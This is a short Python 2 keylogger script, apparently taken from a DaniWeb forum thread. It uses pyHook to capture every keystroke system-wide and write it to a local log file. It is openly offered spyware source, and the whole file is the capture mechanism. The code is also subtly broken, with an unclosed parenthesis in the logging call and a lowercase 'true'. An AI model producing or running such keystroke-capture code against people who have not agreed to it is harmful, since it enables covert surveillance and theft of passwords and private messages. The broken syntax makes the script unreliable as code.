# Python keylogger
# DaniWeb: https://www.daniweb.com/software-development/python/threads/229564/python-keylogger

import pythoncom
import pyHook
import sys
import logging

LOG_FILENAME = 'path\to\log.out'

def OnKeyboardEvent(event):
	logging.basicConfig(filename=LOG_FILENAME, level=logging.DEBUG, format='%(message)s')
	print "Key: ", chr(event.Ascii)
	logging.log(10,chr(event.Ascii)
	return true
	
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()